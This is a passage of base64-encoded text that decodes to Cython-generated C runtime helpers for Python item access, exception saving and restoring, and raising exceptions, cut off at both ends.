9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGFzc19nZXRpdGVtKTtcbiAgICAgICAgaWYgKCFtZXRoKSB7XG4gICAgICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcobWV0aCwga2V5KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTtcbiAgICAgICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgICAgIH1cbiAgICB9XG4gICAgb2JqX3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRShvYmopKTtcbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAiXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgb2JqZWN0IGlzIG5vdCBzdWJzY3JpcHRhYmxlIiwgb2JqX3R5cGVfbmFtZSk7XG4gICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKG9ial90eXBlX25hbWUpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9HZXRJdGVtKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICprZXkpIHtcbiAgICBQeVR5cGVPYmplY3QgKnRwID0gUHlfVFlQRShvYmopO1xuICAgIFB5TWFwcGluZ01ldGhvZHMgKm1tID0gdHAtPnRwX2FzX21hcHBpbmc7XG4gICAgUHlTZXF1ZW5jZU1ldGhvZHMgKnNtID0gdHAtPnRwX2FzX3NlcXVlbmNlO1xuICAgIGlmIChsaWtlbHkobW0gJiYgbW0tPm1wX3N1YnNjcmlwdCkpIHtcbiAgICAgICAgcmV0dXJuIG1tLT5tcF9zdWJzY3JpcHQob2JqLCBrZXkpO1xuICAgIH1cbiAgICBpZiAobGlrZWx5KHNtICYmIHNtLT5zcV9pdGVtKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfR2V0SW5kZXgob2JqLCBrZXkpO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfR2V0SXRlbV9TbG93KG9iaiwga2V5KTtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKlxuX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbihQeVRocmVhZFN0YXRlICp0c3RhdGUpXG57XG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIHdoaWxlICgoZXhjX2luZm8tPmV4Y192YWx1ZSA9PSBOVUxMIHx8IGV4Y19pbmZvLT5leGNfdmFsdWUgPT0gUHlfTm9uZSkgJiZcbiAgICAgICAgICAgZXhjX2luZm8tPnByZXZpb3VzX2l0ZW0gIT0gTlVMTClcbiAgICB7XG4gICAgICAgIGV4Y19pbmZvID0gZXhjX2luZm8tPnByZXZpb3VzX2l0ZW07XG4gICAgfVxuICAgIHJldHVybiBleGNfaW5mbztcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblNhdmUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpO1xuICAgIFB5T2JqZWN0ICpleGNfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgIGlmIChleGNfdmFsdWUgPT0gTlVMTCB8fCBleGNfdmFsdWUgPT0gUHlfTm9uZSkge1xuICAgICAgICAqdmFsdWUgPSBOVUxMO1xuICAgICAgICAqdHlwZSA9IE5VTEw7XG4gICAgICAgICp0YiA9IE5VTEw7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgKnZhbHVlID0gZXhjX3ZhbHVlO1xuICAgICAgICBQeV9JTkNSRUYoKnZhbHVlKTtcbiAgICAgICAgKnR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGV4Y192YWx1ZSk7XG4gICAgICAgIFB5X0lOQ1JFRigqdHlwZSk7XG4gICAgICAgICp0YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfdmFsdWUpO1xuICAgIH1cbiAgI2VsaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpO1xuICAgICp0eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgICp2YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgKnRiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7XG4gICAgUHlfWElOQ1JFRigqdHlwZSk7XG4gICAgUHlfWElOQ1JFRigqdmFsdWUpO1xuICAgIFB5X1hJTkNSRUYoKnRiKTtcbiAgI2Vsc2VcbiAgICAqdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7XG4gICAgKnZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7XG4gICAgKnRiID0gdHN0YXRlLT5leGNfdHJhY2ViYWNrO1xuICAgIFB5X1hJTkNSRUYoKnR5cGUpO1xuICAgIFB5X1hJTkNSRUYoKnZhbHVlKTtcbiAgICBQeV9YSU5DUkVGKCp0Yik7XG4gICNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpIHtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICBQeU9iamVjdCAqdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gdmFsdWU7XG4gICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYodHlwZSk7XG4gICAgUHlfWERFQ1JFRih0Yik7XG4gICNlbHNlXG4gICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAgICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7XG4gICAgZXhjX2luZm8tPmV4Y190eXBlID0gdHlwZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gdmFsdWU7XG4gICAgZXhjX2luZm8tPmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICAjZWxzZVxuICAgIHRtcF90eXBlID0gdHN0YXRlLT5leGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5leGNfdHlwZSA9IHR5cGU7XG4gICAgdHN0YXRlLT5leGNfdmFsdWUgPSB2YWx1ZTtcbiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICAjZW5kaWZcbiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0bXBfdGIpO1xuICAjZW5kaWZcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBpbnQgX19QeXhfX0dldEV4Y2VwdGlvbihQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YilcbiNlbHNlXG5zdGF0aWMgaW50IF9fUHl4X0dldEV4Y2VwdGlvbihQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpXG4jZW5kaWZcbntcbiAgICBQeU9iamVjdCAqbG9jYWxfdHlwZSA9IE5VTEwsICpsb2NhbF92YWx1ZSwgKmxvY2FsX3RiID0gTlVMTDtcbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7XG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgbG9jYWxfdmFsdWUgPSB0c3RhdGUtPmN1cnJlbnRfZXhjZXB0aW9uO1xuICAgIHRzdGF0ZS0+Y3VycmVudF9leGNlcHRpb24gPSAwO1xuICAjZWxzZVxuICAgIGxvY2FsX3R5cGUgPSB0c3RhdGUtPmN1cmV4Y190eXBlO1xuICAgIGxvY2FsX3ZhbHVlID0gdHN0YXRlLT5jdXJleGNfdmFsdWU7XG4gICAgbG9jYWxfdGIgPSB0c3RhdGUtPmN1cmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5jdXJleGNfdHlwZSA9IDA7XG4gICAgdHN0YXRlLT5jdXJleGNfdmFsdWUgPSAwO1xuICAgIHRzdGF0ZS0+Y3VyZXhjX3RyYWNlYmFjayA9IDA7XG4gICNlbmRpZlxuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDBcbiAgICBsb2NhbF92YWx1ZSA9IFB5RXJyX0dldFJhaXNlZEV4Y2VwdGlvbigpO1xuI2Vsc2VcbiAgICBQeUVycl9GZXRjaCgmbG9jYWxfdHlwZSwgJmxvY2FsX3ZhbHVlLCAmbG9jYWxfdGIpO1xuI2VuZGlmXG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+IDB4MDMwQzAwMDBcbiAgICBpZiAobGlrZWx5KGxvY2FsX3ZhbHVlKSkge1xuICAgICAgICBsb2NhbF90eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRShsb2NhbF92YWx1ZSk7XG4gICAgICAgIFB5X0lOQ1JFRihsb2NhbF90eXBlKTtcbiAgICAgICAgbG9jYWxfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2sobG9jYWxfdmFsdWUpO1xuICAgIH1cbiNlbHNlXG4gICAgUHlFcnJfTm9ybWFsaXplRXhjZXB0aW9uKCZsb2NhbF90eXBlLCAmbG9jYWxfdmFsdWUsICZsb2NhbF90Yik7XG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICAgaWYgKHVubGlrZWx5KHRzdGF0ZS0+Y3VyZXhjX3R5cGUpKVxuI2Vsc2VcbiAgICBpZiAodW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpXG4jZW5kaWZcbiAgICAgICAgZ290byBiYWQ7XG4gICAgaWYgKGxvY2FsX3RiKSB7XG4gICAgICAgIGlmICh1bmxpa2VseShQeUV4Y2VwdGlvbl9TZXRUcmFjZWJhY2sobG9jYWxfdmFsdWUsIGxvY2FsX3RiKSA8IDApKVxuICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuI2VuZGlmIC8vIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMEMwMDAwXG4gICAgUHlfWElOQ1JFRihsb2NhbF90Yik7XG4gICAgUHlfWElOQ1JFRihsb2NhbF90eXBlKTtcbiAgICBQeV9YSU5DUkVGKGxvY2FsX3ZhbHVlKTtcbiAgICAqdHlwZSA9IGxvY2FsX3R5cGU7XG4gICAgKnZhbHVlID0gbG9jYWxfdmFsdWU7XG4gICAgKnRiID0gbG9jYWxfdGI7XG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICB7XG4gICAgICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0XG4gICAgICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSBsb2NhbF92YWx1ZTtcbiAgICAgICAgdG1wX3R5cGUgPSBOVUxMO1xuICAgICAgICB0bXBfdGIgPSBOVUxMO1xuICAgICAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpO1xuICAgICAgICBQeV9YREVDUkVGKGxvY2FsX3RiKTtcbiAgICAgICNlbHNlXG4gICAgICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgICAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgICAgICB0bXBfdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjaztcbiAgICAgICAgZXhjX2luZm8tPmV4Y190eXBlID0gbG9jYWxfdHlwZTtcbiAgICAgICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9IGxvY2FsX3ZhbHVlO1xuICAgICAgICBleGNfaW5mby0+ZXhjX3RyYWNlYmFjayA9IGxvY2FsX3RiO1xuICAgICAgI2VuZGlmXG4gICAgfVxuICAgICNlbHNlXG4gICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlO1xuICAgIHRtcF92YWx1ZSA9IHRzdGF0ZS0+ZXhjX3ZhbHVlO1xuICAgIHRtcF90YiA9IHRzdGF0ZS0+ZXhjX3RyYWNlYmFjaztcbiAgICB0c3RhdGUtPmV4Y190eXBlID0gbG9jYWxfdHlwZTtcbiAgICB0c3RhdGUtPmV4Y192YWx1ZSA9IGxvY2FsX3ZhbHVlO1xuICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9IGxvY2FsX3RiO1xuICAgICNlbmRpZlxuICAgIFB5X1hERUNSRUYodG1wX3R5cGUpO1xuICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKHRtcF90Yik7XG4jZWxpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwMDBcbiAgICBQeUVycl9TZXRIYW5kbGVkRXhjZXB0aW9uKGxvY2FsX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKGxvY2FsX3ZhbHVlKTtcbiAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpO1xuICAgIFB5X1hERUNSRUYobG9jYWxfdGIpO1xuI2Vsc2VcbiAgICBQeUVycl9TZXRFeGNJbmZvKGxvY2FsX3R5cGUsIGxvY2FsX3ZhbHVlLCBsb2NhbF90Yik7XG4jZW5kaWZcbiAgICByZXR1cm4gMDtcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDw9IDB4MDMwQzAwMDBcbmJhZDpcbiAgICAqdHlwZSA9IDA7XG4gICAgKnZhbHVlID0gMDtcbiAgICAqdGIgPSAwO1xuICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7XG4gICAgUHlfWERFQ1JFRihsb2NhbF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRihsb2NhbF90Yik7XG4gICAgcmV0dXJuIC0xO1xuI2VuZGlmXG59XG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKSB7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1VuYm91bmRMb2NhbEVycm9yLCAibG9jYWwgdmFyaWFibGUgXCclc1wnIHJlZmVyZW5jZWQgYmVmb3JlIGFzc2lnbm1lbnQiLCB2YXJuYW1lKTtcbn1cblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZUNsb3N1cmVOYW1lRXJyb3IoY29uc3QgY2hhciAqdmFybmFtZSkge1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19OYW1lRXJyb3IsICJmcmVlIHZhcmlhYmxlIFwnJXNcJyByZWZlcmVuY2VkIGJlZm9yZSBhc3NpZ25tZW50IGluIGVuY2xvc2luZyBzY29wZSIsIHZhcm5hbWUpO1xufVxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oaW50IGluX2FzeW5jX2dlbikge1xuICAgIFB5T2JqZWN0ICpleGMsICp2YWwsICp0YiwgKmN1cl9leGMsICpuZXdfZXhjO1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIGludCBpc19hc3luY19zdG9waXRlcmF0aW9uID0gMDtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbl9hc3luY19nZW4pO1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgY3VyX2V4YyA9IF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCk7XG4gICAgaWYgKGxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGN1cl9leGMsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkge1xuICAgICAgICBpZiAoaW5fYXN5bmNfZ2VuICYmIHVubGlrZWx5KF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhjdXJfZXhjLCBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24pKSkge1xuICAgICAgICAgICAgaXNfYXN5bmNfc3RvcGl0ZXJhdGlvbiA9IDE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfR2V0RXhjZXB0aW9uKCZleGMsICZ2YWwsICZ0Yik7XG4gICAgUHlfWERFQ1JFRihleGMpO1xuICAgIFB5X1hERUNSRUYodGIpO1xuICAgIG5ld19leGMgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oUHlFeGNfUnVudGltZUVycm9yLCAicyIsXG4gICAgICAgIGlzX2FzeW5jX3N0b3BpdGVyYXRpb24gPyAiYXN5bmMgZ2VuZXJhdG9yIHJhaXNlZCBTdG9wQXN5bmNJdGVyYXRpb24iIDpcbiAgICAgICAgaW5fYXN5bmNfZ2VuID8gImFzeW5jIGdlbmVyYXRvciByYWlzZWQgU3RvcEl0ZXJhdGlvbiIgOlxuICAgICAgICAiZ2VuZXJhdG9yIHJhaXNlZCBTdG9wSXRlcmF0aW9uIik7XG4gICAgaWYgKCFuZXdfZXhjKSB7XG4gICAgICAgIFB5X1hERUNSRUYodmFsKTtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBQeUV4Y2VwdGlvbl9TZXRDYXVzZShuZXdfZXhjLCB2YWwpOyAvLyBzdGVhbHMgcmVmIHRvIHZhbFxuICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19SdW50aW1lRXJyb3IsIG5ld19leGMpO1xufVxuXG5cbiNpZiBDWVRIT05fVkVDVE9SQ0FMTFxuc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbikge1xuICAgICh2b2lkKV9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdDtcbiAgICBpZiAoX19QeXhfUHlUdXBsZV9TRVRfSVRFTShidWlsZGVyLCBuLCBrZXkpICE9ICgwKSkgcmV0dXJuIC0xO1xuICAgIFB5X0lOQ1JFRihrZXkpO1xuICAgIGFyZ3Nbbl0gPSB2YWx1ZTtcbiAgICByZXR1cm4gMDtcbn1cbkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdfQ2hlY2soUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbikge1xuICAgICh2b2lkKV9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cjtcbiAgICBpZiAodW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhrZXkpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAia2V5d29yZHMgbXVzdCBiZSBzdHJpbmdzIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhrZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGNvbnN0IGNoYXIgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbikge1xuICAgIFB5T2JqZWN0ICpweUtleSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGtleSk7XG4gICAgaWYgKCFweUtleSkgcmV0dXJuIC0xO1xuICAgIHJldHVybiBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcocHlLZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKTtcbn1cbiNlbHNlIC8vIENZVEhPTl9WRUNUT1JDQUxMXG5DWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKiphcmdzLCBDWVRIT05fVU5VU0VEIGludCBuKSB7XG4gICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiBQeURpY3RfU2V0SXRlbShidWlsZGVyLCBrZXksIHZhbHVlKTtcbn1cbiNlbmRpZlxuXG5cbiNpZiAhQ1lUSE9OX1ZFQ1RPUkNBTEwgfHwgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIFB5T2JqZWN0ICphdHRyID0gUHlPYmplY3RfR2V0QXR0cihhcmdzWzBdLCBuYW1lKTtcbiAgICBpZiAodW5saWtlbHkoIWF0dHIpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChhdHRyLCBhcmdzKzEsIG5hcmdzZiAtIDEpO1xuICAgIFB5X0RFQ1JFRihhdHRyKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2UoUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiLCBQeU9iamVjdCAqY2F1c2UpIHtcbiAgICBQeU9iamVjdCogb3duZWRfaW5zdGFuY2UgPSBOVUxMO1xuICAgIGlmICh0YiA9PSBQeV9Ob25lKSB7XG4gICAgICAgIHRiID0gMDtcbiAgICB9IGVsc2UgaWYgKHRiICYmICFQeVRyYWNlQmFja19DaGVjayh0YikpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICJyYWlzZTogYXJnIDMgbXVzdCBiZSBhIHRyYWNlYmFjayBvciBOb25lIik7XG4gICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiAgICBpZiAodmFsdWUgPT0gUHlfTm9uZSlcbiAgICAgICAgdmFsdWUgPSAwO1xuICAgIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHR5cGUpKSB7XG4gICAgICAgIGlmICh2YWx1ZSkge1xuICAgICAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAiaW5zdGFuY2UgZXhjZXB0aW9uIG1heSBub3QgaGF2ZSBhIHNlcGFyYXRlIHZhbHVlIik7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICB2YWx1ZSA9IHR5cGU7XG4gICAgICAgIHR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHZhbHVlKTtcbiAgICB9IGVsc2UgaWYgKFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2sodHlwZSkpIHtcbiAgICAgICAgUHlPYmplY3QgKmluc3RhbmNlX2NsYXNzID0gTlVMTDtcbiAgICAgICAgaWYgKHZhbHVlICYmIFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodmFsdWUpKSB7XG4gICAgICAgICAgICBpbnN0YW5jZV9jbGFzcyA9IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpO1xuICAgICAgICAgICAgaWYgKGluc3RhbmNlX2NsYXNzICE9IHR5cGUpIHtcbiAgICAgICAgICAgICAgICBpbnQgaXNfc3ViY2xhc3MgPSBQeU9iamVjdF9Jc1N1YmNsYXNzKGluc3RhbmNlX2NsYXNzLCB0eXBlKTtcbiAgICAgICAgICAgICAgICBpZiAoIWlzX3N1YmNsYXNzKSB7XG4gICAgICAgICAgICAgICAgICAgIGluc3RhbmNlX2NsYXNzID0gTlVMTDtcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGlzX3N1YmNsYXNzID09IC0xKSkge1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICB0eXBlID0gaW5zdGFuY2VfY2xhc3M7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGlmICghaW5zdGFuY2VfY2xhc3MpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzO1xuICAgICAgICAgICAgaWYgKCF2YWx1ZSlcbiAgICAgICAgICAgICAgICBhcmdzID0gUHlUdXBsZV9OZXcoMCk7XG4gICAgICAgICAgICBlbHNlIGlmIChQeVR1cGxlX0NoZWNrKHZhbHVlKSkge1xuICAgICAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgICAgICAgICAgICAgYXJncyA9IHZhbHVlO1xuICAgICAgICAgICAgfSBlbHNlXG4gICAgICAgICAgICAgICAgYXJncyA9IFB5VHVwbGVfUGFjaygxLCB2YWx1ZSk7XG4gICAgICAgICAgICBpZiAoIWFyZ3MpXG4gICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICBvd25lZF9pbnN0YW5jZSA9IFB5T2JqZWN0X0NhbGwodHlwZSwgYXJncywgTlVMTCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoYXJncyk7XG4gICAgICAgICAgICBpZiAoIW93bmVkX2luc3RhbmNlKVxuICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICAgICAgdmFsdWUgPSBvd25lZF9pbnN0YW5jZTtcbiAgICAgICAgICAgIGlmICghUHlFeGNlcHRpb25J